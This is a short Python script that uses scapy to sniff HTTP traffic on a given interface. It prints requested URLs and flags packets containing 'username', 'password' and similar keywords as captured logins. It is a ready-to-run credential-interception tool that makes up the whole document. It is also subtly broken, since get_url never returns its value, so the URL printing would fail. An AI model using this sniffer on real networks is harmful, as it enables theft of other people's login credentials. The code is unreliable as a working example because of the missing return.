#!/usr/bin/env python3


import scapy.all as scapy
import argparse
from scapy.layers import http


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", help="Interface to sniff from (i.e. wlan0)")
    options = parser.parse_args()
    if not options.interface:
        parser.error("[-] Please specify an interface to sniff from, see --help for more info.")
    return options


def get_url(packet):
    url = str(packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path)


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)
        keywords = ["username", "user", "login", "password", "pass"]
        for keyword in keywords:
            if keyword in load:
                return load


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def process_sniffed_packet(packet):
    # HTTP requests
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request --> " + url + "\n")
        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Login Detected --> " + login_info + "\n\n")


print("[+] Initiating Packet Sniffer..")
options = get_arguments()
print("[+] Sniffing packets from " + options.interface + "..")
sniff(options.interface)
